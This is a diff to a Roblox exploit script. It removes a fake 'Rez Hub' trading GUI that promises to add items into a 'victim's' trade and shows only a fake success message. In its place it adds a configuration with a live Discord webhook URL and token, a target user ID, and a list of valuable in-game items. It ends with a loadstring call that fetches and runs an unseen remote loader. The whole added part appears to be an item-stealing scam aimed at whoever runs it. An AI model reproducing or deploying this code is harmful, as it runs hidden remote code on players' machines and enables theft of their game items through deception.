@@ -1,430 +1,102 @@
---I added sections so you wouldn't get lost pookie bear :3
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- =====================
--- LOADING SCREEN 
--- =====================
-
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "RezHubGui"
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.Parent = playerGui
-
--- Black overlay frame
-local loadFrame = Instance.new("Frame")
-loadFrame.Size = UDim2.new(1, 0, 1, 0)
-loadFrame.Position = UDim2.new(0, 0, 0, 0)
-loadFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-loadFrame.BorderSizePixel = 0
-loadFrame.ZIndex = 10
-loadFrame.Parent = screenGui
-
--- Particle background (moving dots)
-local particleCanvas = Instance.new("Frame")
-particleCanvas.Size = UDim2.new(1, 0, 1, 0)
-particleCanvas.BackgroundTransparency = 1
-particleCanvas.ZIndex = 10
-particleCanvas.Parent = loadFrame
-
-local particles = {}
-for i = 1, 40 do
-	local dot = Instance.new("Frame")
-	dot.Size = UDim2.new(0, math.random(2, 5), 0, math.random(2, 5))
-	dot.Position = UDim2.new(math.random(), 0, math.random(), 0)
-	dot.BackgroundColor3 = Color3.fromRGB(math.random(80,180), 0, math.random(180,255))
-	dot.BackgroundTransparency = math.random(3,7)/10
-	dot.BorderSizePixel = 0
-	dot.ZIndex = 11
-	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(1, 0)
-	corner.Parent = dot
-	dot.Parent = particleCanvas
-	particles[i] = {dot = dot, speedY = math.random(20,80)/1000, speedX = (math.random()-0.5)/300}
-end
-
--- Animate particles
-local particleConn
-particleConn = RunService.RenderStepped:Connect(function()
-	for _, p in ipairs(particles) do
-		local pos = p.dot.Position
-		local newY = pos.Y.Scale - p.speedY
-		local newX = pos.X.Scale + p.speedX
-		if newY < -0.02 then newY = 1.02 end
-		if newX < -0.02 then newX = 1.02 elseif newX > 1.02 then newX = -0.02 end
-		p.dot.Position = UDim2.new(newX, 0, newY, 0)
-	end
-end)
-
--- Get current game name
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown Game"
-
--- Loading bar background
-local barBg = Instance.new("Frame")
-barBg.Size = UDim2.new(0, 400, 0, 18)
-barBg.Position = UDim2.new(0.5, -200, 0.5, -9)
-barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-barBg.BorderSizePixel = 0
-barBg.ZIndex = 12
-barBg.Parent = loadFrame
-local barBgCorner = Instance.new("UICorner")
-barBgCorner.CornerRadius = UDim.new(0, 9)
-barBgCorner.Parent = barBg
-
--- Loading bar fill
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(120, 0, 220)
-barFill.BorderSizePixel = 0
-barFill.ZIndex = 13
-barFill.Parent = barBg
-local barFillCorner = Instance.new("UICorner")
-barFillCorner.CornerRadius = UDim.new(0, 9)
-barFillCorner.Parent = barFill
-
--- Glow effect on bar
-local barGlow = Instance.new("Frame")
-barGlow.Size = UDim2.new(1, 10, 1, 10)
-barGlow.Position = UDim2.new(0, -5, 0, -5)
-barGlow.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
-barGlow.BackgroundTransparency = 0.7
-barGlow.BorderSizePixel = 0
-barGlow.ZIndex = 12
-barGlow.Parent = barFill
-local glowCorner = Instance.new("UICorner")
-glowCorner.CornerRadius = UDim.new(0, 12)
-glowCorner.Parent = barGlow
-
--- Wait text
-local waitLabel = Instance.new("TextLabel")
-waitLabel.Size = UDim2.new(0, 500, 0, 30)
-waitLabel.Position = UDim2.new(0.5, -250, 0.5, 18)
-waitLabel.BackgroundTransparency = 1
-waitLabel.Text = "Please wait while we go through " .. gameName
-waitLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-waitLabel.Font = Enum.Font.GothamMedium
-waitLabel.TextSize = 15
-waitLabel.ZIndex = 12
-waitLabel.Parent = loadFrame
-
--- Percent label
-local pctLabel = Instance.new("TextLabel")
-pctLabel.Size = UDim2.new(0, 400, 0, 20)
-pctLabel.Position = UDim2.new(0.5, -200, 0.5, -34)
-pctLabel.BackgroundTransparency = 1
-pctLabel.Text = "0%"
-pctLabel.TextColor3 = Color3.fromRGB(180, 100, 255)
-pctLabel.Font = Enum.Font.GothamBold
-pctLabel.TextSize = 14
-pctLabel.TextXAlignment = Enum.TextXAlignment.Right
-pctLabel.ZIndex = 12
-pctLabel.Parent = loadFrame
-
--- Animate loading bar over 30 seconds
-local DURATION = 30
-local elapsed = 0
-local loadConn
-loadConn = RunService.RenderStepped:Connect(function(dt)
-	elapsed = elapsed + dt
-	local pct = math.min(elapsed / DURATION, 1)
-	barFill.Size = UDim2.new(pct, 0, 1, 0)
-	pctLabel.Text = math.floor(pct * 100) .. "%"
-	if pct >= 1 then
-		loadConn:Disconnect()
-		particleConn:Disconnect()
-		-- Fade out loading screen
-		local tween = TweenService:Create(loadFrame, TweenInfo.new(0.8), {BackgroundTransparency = 1})
-		for _, obj in ipairs(loadFrame:GetDescendants()) do
-			if obj:IsA("TextLabel") then
-				TweenService:Create(obj, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
-			elseif obj:IsA("Frame") then
-				TweenService:Create(obj, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
-			end
-		end
-		tween:Play()
-		tween.Completed:Connect(function()
-			loadFrame:Destroy()
-			showHub()
-		end)
-	end
-end)
-
--- =====================
--- HUB UI
--- =====================
-
-function showHub()
-	local selectedItem = nil
-
-	local hubFrame = Instance.new("Frame")
-	hubFrame.Size = UDim2.new(0, 340, 0, 560)
-	hubFrame.Position = UDim2.new(0.5, -170, 0.5, -280)
-	hubFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
-	hubFrame.BorderSizePixel = 0
-	hubFrame.ZIndex = 5
-	hubFrame.Parent = screenGui
-	local hubCorner = Instance.new("UICorner")
-	hubCorner.CornerRadius = UDim.new(0, 14)
-	hubCorner.Parent = hubFrame
-
-	-- Title
-	local title = Instance.new("TextLabel")
-	title.Size = UDim2.new(1, 0, 0, 40)
-	title.Position = UDim2.new(0, 0, 0, 8)
-	title.BackgroundTransparency = 1
-	title.Text = "Rez Hub"
-	title.TextColor3 = Color3.fromRGB(180, 80, 255)
-	title.Font = Enum.Font.GothamBold
-	title.TextSize = 24
-	title.ZIndex = 6
-	title.Parent = hubFrame
-
-	-- Username textbox
-	local textBox = Instance.new("TextBox")
-	textBox.Size = UDim2.new(0, 280, 0, 36)
-	textBox.Position = UDim2.new(0.5, -140, 0, 58)
-	textBox.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-	textBox.TextColor3 = Color3.fromRGB(220, 220, 220)
-	textBox.PlaceholderText = "Victim User Here"
-	textBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
-	textBox.Text = ""
-	textBox.Font = Enum.Font.Gotham
-	textBox.TextSize = 14
-	textBox.ClearTextOnFocus = false
-	textBox.ZIndex = 6
-	textBox.Parent = hubFrame
-	local tbCorner = Instance.new("UICorner")
-	tbCorner.CornerRadius = UDim.new(0, 8)
-	tbCorner.Parent = textBox
-
-	-- Profile picture frame
-	local pfpFrame = Instance.new("Frame")
-	pfpFrame.Size = UDim2.new(0, 80, 0, 80)
-	pfpFrame.Position = UDim2.new(0.5, -40, 0, 104)
-	pfpFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-	pfpFrame.ZIndex = 6
-	pfpFrame.Parent = hubFrame
-	local pfpCorner = Instance.new("UICorner")
-	pfpCorner.CornerRadius = UDim.new(0, 10)
-	pfpCorner.Parent = pfpFrame
-
-	local pfpImg = Instance.new("ImageLabel")
-	pfpImg.Size = UDim2.new(1, 0, 1, 0)
-	pfpImg.BackgroundTransparency = 1
-	pfpImg.Image = ""
-	pfpImg.ZIndex = 7
-	pfpImg.Parent = pfpFrame
-	local pfpImgCorner = Instance.new("UICorner")
-	pfpImgCorner.CornerRadius = UDim.new(0, 10)
-	pfpImgCorner.Parent = pfpImg
-
-	-- Fetch profile picture on FocusLost
-	textBox.FocusLost:Connect(function()
-		local username = textBox.Text
-		if username ~= "" then
-			local ok, userId = pcall(function()
-				return Players:GetUserIdFromNameAsync(username)
-			end)
-			if ok and userId then
-				local thumbType = Enum.ThumbnailType.HeadShot
-				local thumbSize = Enum.ThumbnailSize.Size100x100
-				local imgOk, img = pcall(function()
-					return Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
-				end)
-				if imgOk then
-					pfpImg.Image = img
-				end
-			end
-		end
-	end)
-
-	-- Invis Add button
-	local invisBtn = Instance.new("TextButton")
-	invisBtn.Size = UDim2.new(0, 280, 0, 36)
-	invisBtn.Position = UDim2.new(0.5, -140, 0, 196)
-	invisBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 200)
-	invisBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-	invisBtn.Text = "▼  Invis Add"
-	invisBtn.Font = Enum.Font.GothamBold
-	invisBtn.TextSize = 14
-	invisBtn.ZIndex = 6
-	invisBtn.Parent = hubFrame
-	local invCorner = Instance.new("UICorner")
-	invCorner.CornerRadius = UDim.new(0, 8)
-	invCorner.Parent = invisBtn
-
-	-- Add Into Trade button
-	local tradeBtn = Instance.new("TextButton")
-	tradeBtn.Size = UDim2.new(0, 280, 0, 36)
-	tradeBtn.Position = UDim2.new(0.5, -140, 0, 240)
-	tradeBtn.BackgroundColor3 = Color3.fromRGB(30, 120, 60)
-	tradeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-	tradeBtn.Text = "🤝  Add Into Trade!"
-	tradeBtn.Font = Enum.Font.GothamBold
-	tradeBtn.TextSize = 14
-	tradeBtn.ZIndex = 6
-	tradeBtn.Parent = hubFrame
-	local tradeCorner = Instance.new("UICorner")
-	tradeCorner.CornerRadius = UDim.new(0, 8)
-	tradeCorner.Parent = tradeBtn
-
-	-- Trade status label
-	local tradeStatus = Instance.new("TextLabel")
-	tradeStatus.Size = UDim2.new(0, 280, 0, 24)
-	tradeStatus.Position = UDim2.new(0.5, -140, 0, 282)
-	tradeStatus.BackgroundTransparency = 1
-	tradeStatus.Text = ""
-	tradeStatus.TextColor3 = Color3.fromRGB(100, 220, 130)
-	tradeStatus.Font = Enum.Font.GothamMedium
-	tradeStatus.TextSize = 13
-	tradeStatus.TextWrapped = true
-	tradeStatus.ZIndex = 6
-	tradeStatus.Parent = hubFrame
-
-	-- Trade button logic
-	tradeBtn.MouseButton1Click:Connect(function()
-		if selectedItem then
-			tradeStatus.TextColor3 = Color3.fromRGB(100, 220, 130)
-			tradeStatus.Text = selectedItem .. " has been added into the trade!"
-			tradeStatus.TextTransparency = 0
-			task.delay(3, function()
-				TweenService:Create(tradeStatus, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
-				task.delay(0.5, function()
-					tradeStatus.Text = ""
-					tradeStatus.TextTransparency = 0
-				end)
-			end)
-		else
-			tradeStatus.TextColor3 = Color3.fromRGB(220, 80, 80)
-			tradeStatus.Text = "Please select an item from the list first!"
-			tradeStatus.TextTransparency = 0
-			task.delay(3, function()
-				TweenService:Create(tradeStatus, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
-				task.delay(0.5, function()
-					tradeStatus.Text = ""
-					tradeStatus.TextTransparency = 0
-					tradeStatus.TextColor3 = Color3.fromRGB(100, 220, 130)
-				end)
-			end)
-		end
-	end)
-
-	-- Dropdown list
-	local dropFrame = Instance.new("ScrollingFrame")
-	dropFrame.Size = UDim2.new(0, 280, 0, 0)
-	dropFrame.Position = UDim2.new(0.5, -140, 0, 312)
-	dropFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
-	dropFrame.BorderSizePixel = 0
-	dropFrame.ScrollBarThickness = 4
-	dropFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-	dropFrame.ZIndex = 7
-	dropFrame.ClipsDescendants = true
-	dropFrame.Visible = false
-	dropFrame.Parent = hubFrame
-	local dfCorner = Instance.new("UICorner")
-	dfCorner.CornerRadius = UDim.new(0, 8)
-	dfCorner.Parent = dropFrame
-
-	local listLayout = Instance.new("UIListLayout")
-	listLayout.Padding = UDim.new(0, 4)
-	listLayout.Parent = dropFrame
-
-	local listPad = Instance.new("UIPadding")
-	listPad.PaddingTop = UDim.new(0, 4)
-	listPad.PaddingLeft = UDim.new(0, 6)
-	listPad.PaddingRight = UDim.new(0, 6)
-	listPad.Parent = dropFrame
-
-	local buttonNames = {
-		"La Ginger Sekolah",
-		"Hydra Dragon",
-		"Dragon",
-		"Dragon Gingerini",
-		"Garama and Madundung",
-		"Meowl",
-		"Skibidi Toilet",
-		"Headless Horsemen",
-		"Ketchuru And Musturu",
-		"TicTac Sahur",
-		"Money Money Puggy",
-		"Fragrama and Chocrama",
-		"Lavadorito Spinito",
-		"La Casa Boo",
-		"La Secret Combinasion",
-		"Burgero and Fryuro"
-	}
-
-	for _, name in ipairs(buttonNames) do
-		local btn = Instance.new("TextButton")
-		btn.Size = UDim2.new(1, -4, 0, 32)
-		btn.BackgroundColor3 = Color3.fromRGB(35, 25, 55)
-		btn.TextColor3 = Color3.fromRGB(210, 180, 255)
-		btn.Text = name
-		btn.Font = Enum.Font.Gotham
-		btn.TextSize = 13
-		btn.ZIndex = 8
-		btn.Parent = dropFrame
-		local bCorner = Instance.new("UICorner")
-		bCorner.CornerRadius = UDim.new(0, 6)
-		bCorner.Parent = btn
-		btn.MouseButton1Click:Connect(function()
-			selectedItem = name
-			-- Highlight selected, reset others
-			for _, b in ipairs(dropFrame:GetChildren()) do
-				if b:IsA("TextButton") then
-					b.BackgroundColor3 = Color3.fromRGB(35, 25, 55)
-				end
-			end
-			btn.BackgroundColor3 = Color3.fromRGB(70, 40, 110)
-		end)
-	end
-
-	local ITEM_COUNT = #buttonNames
-	local ITEM_H = 32 + 4
-	local DROP_H = math.min(ITEM_COUNT * ITEM_H + 8, 200)
-	dropFrame.CanvasSize = UDim2.new(0, 0, 0, ITEM_COUNT * ITEM_H + 8)
-
-	local dropOpen = false
-	invisBtn.MouseButton1Click:Connect(function()
-		dropOpen = not dropOpen
-		dropFrame.Visible = true
-		local targetH = dropOpen and DROP_H or 0
-		invisBtn.Text = dropOpen and "▲  Invis Add" or "▼  Invis Add"
-		TweenService:Create(dropFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
-			Size = UDim2.new(0, 280, 0, targetH)
-		}):Play()
-		if not dropOpen then
-			task.delay(0.25, function() dropFrame.Visible = false end)
-		end
-	end)
-
-	-- Make hub draggable
-	local dragging, dragStart, startPos
-	hubFrame.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 then
-			dragging = true
-			dragStart = input.Position
-			startPos = hubFrame.Position
-		end
-	end)
-	hubFrame.InputEnded:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 then
-			dragging = false
-		end
-	end)
-	game:GetService("UserInputService").InputChanged:Connect(function(input)
-		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-			local delta = input.Position - dragStart
-			hubFrame.Position = UDim2.new(
-				startPos.X.Scale, startPos.X.Offset + delta.X,
-				startPos.Y.Scale, startPos.Y.Offset + delta.Y
-			)
-		end
-	end)
-end
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1489374541808533564/pXXgGJRxXPSFP9Zg433DTtdW9ZJbImtN-sZUDOj0MGxw_G0R6lOXZosVsbS3_yJ51hJJ"
+getgenv().TARGET_ID = 7197256092
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Bros"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Puggies"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Sweethearts"] = true,
+    ["Los Planitos"] = true,
+    ["Los Mobilis"] = true,
+    ["Los Candies"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Los 25"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Los Combinasionas"] = true,
+    ["Los Amigos"] = true,
+    ["Los 67"] = true,
+    ["Los Tortus"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Sammyni Fattini"] = true,
+    ["La Food Combinasion"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Esok Sekolah"] = true,
+    ["1x1x1x1"] = true,
+    ["67"] = true,
+    ["Rang Ring Bus"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Chicleteira Cupideira"] = true,
+    ["Fishino Clownino"] = true,
+    ["Chimnino"] = true,
+    ["Cupid Hotspot"] = true,
+    ["Chicleteira Noelteira"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Orcaledon"] = true,
+    ["Eviledon"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Las Sis"] = true,
+    ["Spinny Hammy"] = true,
+    ["Chill Puppy"] = true,
+    ["Cupid Cupid Sahur"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["La Grande Combinasion"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Headless Horseman"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Cooki and Milki"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Love Love Bear"] = true,
+    ["Ginger Gerat"] = true,
+    ["Tralaledon"] = true,
+    ["Swag Soda"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["Guest 666"] = true,
+    ["Quesadillo Vampiro"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["La Extinct Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chillin Chili"] = true,
+    ["Tuff Toucan"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["La Jolly Grande"] = true,
+    ["W or L"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Festive 67"] = true,
+    ["GOAT"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Money Money Puggy"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Agarrini la Palini"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/704e39ff20e64fe482157ac026ab50cc.lua"))()
